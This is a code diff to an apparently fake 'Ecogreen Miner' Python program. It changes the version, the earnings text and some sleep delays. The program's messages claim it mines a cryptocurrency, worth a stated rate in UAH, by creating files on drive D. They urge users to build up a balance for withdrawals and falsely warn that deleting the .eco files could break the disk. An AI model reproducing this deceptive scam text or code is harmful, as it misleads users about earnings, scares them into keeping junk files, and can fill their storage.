@@ -11,7 +11,7 @@ UPDATE_URL = "https://raw.githubusercontent.com/Mavox-ID/ecogreen-miner/main/eco
 BALANCE_FILE = "C:/Intel/BB_ecogreen.txt"
 
 APP_NAME = "Ecogreen Miner"
-APP_VERSION = "4.5"
+APP_VERSION = "5.5"
 APP_DESCRIPTION = "Official Ecogreen Mining Application."
 APP_AUTHOR = "Mavox-ID"
 APP_COMPANY = "OOO Kripto"
@@ -40,7 +40,7 @@ def display_intro():
     intro_text = f"""
     Welcome to the official Ecogreen mining application!
     Here you can mine Ecogreen cryptocurrency and purchase additional assets and speeds.
-    By default, 10 files are created per second, earning 0.001 Ecogreen per second.
+    By default, 10 files are created per second, earning 0.01 Ecogreen per 500 files.
     Current rate: 230 UAH = 1 Ecogreen.
     Attention! Ecogreen releases updates regularly. If you use an outdated version, withdrawals may not be supported.
     Ensure your balance is above 50 Ecogreen for compatibility with newer versions!
@@ -120,6 +120,7 @@ def mine_ecogreen(disk_letter):
                   "hashes from the disk! (If you delete them until we process them, your disk may break, or no longer "
                   "work, because this extension: .eco is a collection of data and tasks that heavily load the disk, "
                   "their removal can lead to disk failure)\n")
+            time.sleep(15)
             break
 
         
@@ -144,6 +145,7 @@ if __name__ == "__main__":
     while True:
         if check_disk_exists("D"):
             print("Disk D:/ found. Starting mining...")
+            time.sleep(5)
             mine_ecogreen("D")
         else:
             print("HDD for mining Ecogreen cryptocurrency was not found.")
